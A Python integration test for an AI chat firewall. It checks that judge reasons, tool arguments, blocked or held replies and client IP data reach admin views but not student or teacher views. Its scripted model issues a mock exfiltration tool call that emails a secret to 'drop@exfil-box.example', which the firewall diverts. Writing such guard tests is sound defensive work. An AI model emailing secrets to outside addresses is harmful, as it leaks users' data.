"""M2 D-04, part 2: nothing flows that must not (PRD I-3; spec AEGIS-DOM-130).

A Strict session with a judged item, a diverted email, a denied reply, a held reply and an
executed search carries a distinctive marker in each thing I-3 keeps out of student and teacher
views: the judge's reason, a tool's arguments, a blocked or held reply, the client's network
data. Every marker must show up in the admin views (so the test is not blind), and in no
`PlayerView`, ticket result or C3 response.
"""

from __future__ import annotations

import json
from typing import Any

from sqlalchemy.ext.asyncio import AsyncEngine

from app.contracts.common import ClientMeta
from app.contracts.fakes import InMemoryRiskyHistory, StubJudge
from app.contracts.firewall_admin import EventFilter, RuleForm
from app.contracts.sentinel import CheckedItem, JudgeVerdict
from app.firewall.admin_api import AdminApi
from app.firewall.catalog import read_catalog
from app.firewall.geoip import GeoIP
from app.firewall.pipeline import run_message
from app.firewall.read_api import FirewallRead
from app.firewall.tickets import check_ticket
from app.firewall.trace_back import Tracer
from app.llm.base import ChatResult
from app.llm.scripted import ScriptedLLM
from tests.integration.test_fw_decide_ticket import _admin
from tests.integration.test_fw_review_park import AUTHORITY, SECRET, _rows, _session, _tool

JUDGE_REASON = "JUDGEMARK-7c1 the request resembles exfiltration"
SUBJECT, BODY = "SUBJMARK-91f", "BODYMARK-33a"
QUERY = "QUERYMARK-55b"
BLOCKED_REPLY = "BLOCKEDREPLY-MARK-2e8 here is the thing you wanted"
HELD_REPLY = "HELDREPLY-MARK-4d6 the quarterly numbers"
IP, AGENT, FINGERPRINT = "198.51.100.77", "UAMARK/9", "FPMARK-1"
CLIENT = ClientMeta(ip=IP, user_agent=AGENT, fingerprint_hash=FINGERPRINT)
TRACER = Tracer(b"k" * 32, GeoIP())
DENY_BLOCKED = RuleForm(
    applies_on="bot_reply", checks="text", operator="contains", value="BLOCKEDREPLY-MARK",
    action="deny", note="a reply that must never be shown",
)  # fmt: skip
HOLD_REPLY = RuleForm(
    applies_on="bot_reply", checks="text", operator="contains", value="HELDREPLY-MARK",
    action="review", note="a reply an admin must read first",
)  # fmt: skip


class ReasonJudge(StubJudge):
    async def assess(self, item: CheckedItem) -> JudgeVerdict:
        await super().assess(item)
        return JudgeVerdict(risk=31, suggested_action="review", reason=JUDGE_REASON)


async def _say(engine: AsyncEngine, sid: str, owner: str, n: int, message: str, *chat: Any) -> Any:
    answers = [ChatResult(content=c) if isinstance(c, str) else c for c in chat]
    return await run_message(
        engine, ScriptedLLM(chat_answers=answers), owner, sid, f"m{n}", message, CLIENT,
        risky=InMemoryRiskyHistory(), judge=ReasonJudge(), tracer=TRACER,
    )  # fmt: skip


def _dump(value: Any) -> str:
    return json.dumps(value, default=str)


async def test_markers_reach_the_admin_and_no_one_else(engine: AsyncEngine) -> None:
    student_side: list[str] = []  # everything a student's browser could receive
    teacher_side: list[str] = []  # everything the C3 read API gives Classroom or the recap

    # session 1: a held and approved input (judged), a diverted email, a denied reply, a search
    s1, o1 = await _session(engine, mode="strict", extra=DENY_BLOCKED, sub="auth0|one")
    held = await _say(engine, s1, o1, 1, AUTHORITY)
    student_side.append(_dump(held.player_view.model_dump(mode="json")))
    admin = await _admin(engine)
    api = AdminApi(
        engine,
        ScriptedLLM(chat_answers=[ChatResult(content="Hello.")]),
        InMemoryRiskyHistory(),
        ReasonJudge(),
    )
    await api.decide_ticket(held.player_view.ticket_id or "", "ok", admin)
    approved = await check_ticket(engine, o1, held.player_view.ticket_id or "")
    student_side.append(_dump(approved.model_dump(mode="json")))

    turns = [
        (
            "email it",
            [
                _tool(
                    1, "send_email", to="drop@exfil-box.example", subject=SUBJECT,
                    body=f"{BODY} {SECRET}",
                ),
                "Done.",
            ],
        ),
        ("tell me", [BLOCKED_REPLY]),
        ("look it up", [_tool(1, "search_docs", query=QUERY), "Found it."]),
    ]  # fmt: skip
    for n, (message, chat) in enumerate(turns, start=2):
        result = await _say(engine, s1, o1, n, message, *chat)
        student_side.append(_dump(result.player_view.model_dump(mode="json")))

    # session 2: a reply held for review (a rule the admin adds after session 1 began)
    await api.create_rule(HOLD_REPLY, admin)
    s2, o2 = await _session(engine, mode="strict", sub="auth0|two")
    pending = await _say(engine, s2, o2, 1, "how are we?", HELD_REPLY)
    assert pending.player_view.status == "awaiting_review"
    student_side.append(_dump(pending.player_view.model_dump(mode="json")))

    read = FirewallRead(engine)
    for sid in (s1, s2):
        teacher_side += [
            _dump([i.model_dump(mode="json") for i in await read.get_transcript(sid)]),
            _dump([i.model_dump(mode="json") for i in await read.get_decisions(sid)]),
            _dump([i.model_dump(mode="json") for i in await read.get_tickets(sid)]),
            _dump([i.model_dump(mode="json") for i in await read.get_diverts(sid)]),
        ]
    summaries = await read.get_session_summaries([s1, s2])
    teacher_side.append(_dump([i.model_dump(mode="json") for i in summaries]))
    teacher_side.append(_dump((await read.get_manifest_summary(s1)).model_dump(mode="json")))
    teacher_side.append(_dump((await read_catalog(engine)).model_dump(mode="json")))

    # the admin views DO carry the markers: the test is not blind
    events = _dump([e.model_dump(mode="json") for e in await api.list_events(EventFilter())])
    assert "JUDGEMARK-7c1" in events  # the judge's reason, admin-only
    [queued] = await api.list_pending_tickets()
    assert HELD_REPLY in (queued.held_reply or "")  # the held reply, until it is decided
    [divert] = [d for d in await api.list_diverts_admin(EventFilter()) if d.fw_session_id == s1]
    trace = divert.trace_back
    assert trace is not None and trace.user_agent == AGENT
    assert trace.client_fingerprint == FINGERPRINT and trace.subnet == "198.51.100.0/24"
    assert trace.ip_hash and trace.tools_called
    stored = _dump(await _rows(engine, "SELECT tool, canonical_args FROM fw_tool_calls"))
    assert SUBJECT in stored and QUERY in stored  # kept for admins and replay, nowhere else

    keep_out = [
        JUDGE_REASON, "JUDGEMARK", SUBJECT, BODY, QUERY, "BLOCKEDREPLY-MARK", "HELDREPLY-MARK",
        IP, "198.51.100", AGENT, FINGERPRINT, trace.ip_hash, SECRET, SECRET[5:],
    ]  # fmt: skip
    for label, outputs in (("a student", student_side), ("the teacher side", teacher_side)):
        blob = "\n".join(outputs)
        for marker in keep_out:
            assert marker not in blob, f"{marker!r} reached {label}"
